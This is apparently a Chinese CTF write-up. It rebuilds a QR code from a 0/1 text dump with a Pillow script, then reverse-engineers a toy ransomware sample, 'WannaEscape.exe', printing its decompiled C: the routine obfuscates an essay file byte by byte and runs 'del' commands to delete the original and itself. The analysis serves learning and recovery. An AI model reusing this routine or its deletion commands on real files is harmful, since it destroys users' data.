0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 </span><br><span class="line">0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 </span><br><span class="line">0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 </span><br><span class="line">0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 </span><br><span class="line">0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 </span><br><span class="line">1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0</span><br><span class="line">0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 </span><br><span class="line">0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1</span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br><span class="line">1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 </span><br><span class="line">0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 0 1 1 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 </span><br></pre></td></tr></table></figure></div>

<p>由于最后成功的提示是：”you can go furthur with ‘import image from PIL’” ，因此我以为这是某张图片的”字节数据”，所以研究了好久如何将文本数据的10直接塞到字节位中，后来发现不仅麻烦，而且这题也不是这个意思。</p>
<p><code>ios::binary</code> 以二进制文件格式打开文件，多种方式的连接：<code>ios::out | ios::binary</code> 。输入数据时指定数据地址的起点与大小，并源数据地址上的内容添加到目标地址。</p>
<p>在此吐槽一下字节数据问题，我发现实现文本的01直接原样化为二进制下字节各位的值居然这么困难…甚至找不到一些好的办法实现。最后的想法是利用python中的字符串转字节的快捷语法 <code>b&#39;str&#39;</code> ，通过C++将二进制数据转化为十六进制并添加前缀 <code>\x</code> 得到字符串输入python中转化为字节流实现，但是效果很不理想，而事实上本题也不是这个意思。虽然但是，这个确实很有说法，除了010editor中的脚本快捷输入外，是否还有别的办法将文本形态的01字节流直接转化为字节形态的数据呢？（文本的 <code>01</code> 的十六进制字节数据是两个字节的 <code>00 01</code> ）。PIL是Python2的版本，Python3已经更新为Pillow了。</p>
<p>只分黑白的成为二值图片，此处的01序列并非某张图片的字节数据，而是二值图的内容，将其整理成384*24的尺寸即可获得小半张二维码….网上只有用PIL将图片二值化的过程，没有逆过程，可能还是需要自己学习了PIL以后才能做到。因此选择直接将二值图放到txt中缩放各种尺寸，最后发现了半张二维码。</p>
<p>其实这里的尺寸不对，题目里提示：’二向箔的斑马’&#x3D;&gt;’二维马’（什么冷笑话）。考虑到二维码多为方形的，总像素点是9216&#x3D;96^2，所以如果真是二维码应该是96*96的。</p>
<h4 id="Python图像处理"><a href="#Python图像处理" class="headerlink" title="Python图像处理"></a>Python图像处理</h4><p>我没想到一道题能让我血压高两次…国内这个互联网环境真是抽象啊，为什么我找一个图像处理包的教程，几乎没有一个告诉我如何操作像素颜色的啊…真的很离谱，其中还有几个假文档…简单搜罗了很久很久很久，终于写出以下脚本用于还原二维码：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img=Image.new(<span class="string">&#x27;1&#x27;</span>,(<span class="number">96</span>,<span class="number">96</span>),<span class="number">1</span>)</span><br><span class="line">img_arr=img.load()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;./res.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span>):</span><br><span class="line">        s=f.read(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            img_arr[i,j]=<span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">f.close();</span><br><span class="line">img.save(<span class="string">&#x27;./233.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>简单整理一下相关知识点：</p>
<ol>
<li><p>用的是python3的Pillow包，一个图像处理包，python3的官方文档里莫得它，而且找不到完整的教程也找不到它自己的文档…（这应该是我自己的问题）</p>
</li>
<li><p>引入PIL包中的Image类，然后用 <code>new(mode,size,color)</code> 新建一张纯色图片，由于模式选的是’1’（必须有引号），所以是单色，颜色直接填写1即可，0是黑色，1是白色，而尺寸自然是96*96。</p>
</li>
<li><p>python中不需要任何包调用即可使用函数 <code>open(str,mode)</code> 打开文件，默认不加参数至少可以读… <code>r</code> 读方式打开，若文件不存在则报错；<code>w</code> 以写方式打开，文件存在则清空，不存在则创建；<code>b</code> 以二进制模式打开；<code>r+</code> 或 <code>w+</code> 以读写方式打开。最后别忘了关闭文件。</p>
</li>
<li><p>用 <code>file.read(size)</code> 函数读取指定个数的内容，并且指针向后推移。</p>
</li>
<li><p><code>type(s)</code> 返回s的类型；<code>range(95)</code> 返回0-94的所有整数，<code>range(3,5,2)</code> 只返回3，因为步长是2，而5是取不到的，该函数返回的实际上是一个整数列表；</p>
</li>
<li><p>用 <code>Image.load()</code> 函数加载对象的像素，可以用 <code>[a,b]</code> 访问a+1行b+1列的像素并修改它的值。</p>
</li>
<li><p>用函数 <code>.save(location)</code> 存储图片到指定位置。 </p>
</li>
<li><p>还有一个在很多教程都提到的 <code>lambda</code> ，用于快速创建一个函数：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">g = <span class="keyword">lambda</span> x:x+<span class="number">1</span> <span class="comment">#求x+1</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>还原后得到一张二维码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539739.jpg"
                     
                ></p>
<p>扫描后得到flag。</p>
<p>还有一篇用PIL将图片二值化的资料：<a class="link"   href="https://blog.csdn.net/weixin_45755831/article/details/122004205" >使用PIL库获取图片的二进制&#x2F;01文本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/58671158" >木头人-图像处理 Pillow库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://docs.python.org/zh-cn/3/" >没有Pillow包的中文Python3104文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_43790276/article/details/108478270" >Python的碎片-Python Pillow库的用法介绍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_40089648/article/details/89022804" >Python中lambda的用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_41496108/article/details/108680912" >欢天喜地小姐姐-range()函数用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/lly1122334/article/details/108218530" >XerCis-Python PIL和二进制图片互转 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/ShakalakaPHD/article/details/117729550" >Hurri_cane-Python中字节Byte数据与列表、十六进制转换 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/yqpy/p/8556090.html" >嶙羽-Python中StringIO和BytesIO <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_44159028/article/details/120388405" >山山而川’-Python 文件打开读取写入方式 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.osgeo.cn/pillow/handbook/index.html" >pillow小文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="骗！偷袭！勒索绑架！【任务A：数据恢复】"><a href="#骗！偷袭！勒索绑架！【任务A：数据恢复】" class="headerlink" title="骗！偷袭！勒索绑架！【任务A：数据恢复】"></a>骗！偷袭！勒索绑架！【任务A：数据恢复】</h3><p>题目给了两份文件，一份是”WannaEscape.exe”，也就是病毒程序，一份是”required_essay.txt.WannaEscape”。将exe程序拖进ida，在左侧找到main函数，然后F5恢复一下伪代码（这应该是C语言？）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 buf[<span class="number">1024</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 c; <span class="comment">// [rsp+42Fh] [rbp+3AFh]</span></span><br><span class="line">  <span class="type">size_t</span> bufsz; <span class="comment">// [rsp+430h] [rbp+3B0h]</span></span><br><span class="line">  FILE *fout; <span class="comment">// [rsp+438h] [rbp+3B8h]</span></span><br><span class="line">  FILE *fin; <span class="comment">// [rsp+440h] [rbp+3C0h]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [rsp+448h] [rbp+3C8h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  fin = fopen(<span class="string">&quot;required_essay.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fout = fopen(<span class="string">&quot;required_essay.txt.WannaEscape&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fin &amp;&amp; fout )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( bufsz = <span class="number">0</span>i64; ; fwrite(buf, <span class="number">1u</span>i64, bufsz, fout) )</span><br><span class="line">    &#123;</span><br><span class="line">      bufsz = fread(buf, <span class="number">1u</span>i64, <span class="number">0x400</span>ui64, fin);<span class="comment">// 1024个一字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( !bufsz )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>i64; i &lt; bufsz; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        c = buf[i];</span><br><span class="line">        c += (i &amp; <span class="number">0xF</span>) + <span class="number">127</span>;</span><br><span class="line">        buf[i] = c;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fin);</span><br><span class="line">    fclose(fout);</span><br><span class="line">    system(<span class="string">&quot;del required_essay.txt&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;del WannaEscape.exe&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( fin )</span><br><span class="line">      fclose(fin);</span><br><span class="line">    <span class="keyword">if</span> ( fout )</span><br><span class="line">      fclose(fout);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单浏览一下程序的功能：读入”required_essay.txt”文本（这就是我们要恢复英语大作业）的数据，再打开”required_essay.txt.WannaEscape”用于写入数据，然后每次读入1024个1字节大小的数据到buf指针中（这里它的定义是”unsigned _int8”可能是指占8位的整数类型，因为用他存储的是一字节大小的数据），然后做一个简单的运算，然后输出到文件”required_essay.txt.WannaEscape”中，因此这就是个经过恶意处理的备份论文。</p>
<p><code>fopen()</code> 应该是C语言中的打开文件函数，第二项参数是打开模式，<code>size_t fwrite(const void * buffer, size_t size, size_t count, FILE * stream)</code> 会从buffer中读取count个size字节大小数据写入到文件流中，<code>fread()</code> 类似，不过它会返回读取的数据大小；<code>0i64</code> 的写法表示的是int64类型的数值0，<code>1ui64</code> 类似。</p>
<p><code>i &amp; 0xF</code> 是将i的最后四位保留，其他全部置0，得到的数值再加上127，加到原论文的字节值中，但其实不用计算具体数值，因为它只由迭代的i决定，恢复的时候直接剪掉即可。最后调用 <code>system()</code> 函数删除原论文文件和病毒文件本身。因为本地是没有原论文文件的，所以文件会打开失败导致循环不执行，这两条删除语句是执行不到的，但是由于”required_essay.txt.WannaEscape”被用于输出打开过，会被直接置空，所以如果在本地运行该程序，会出现没发生任何事但是论文备份却变空的情况。接下来用C++恢复原论文：</p>
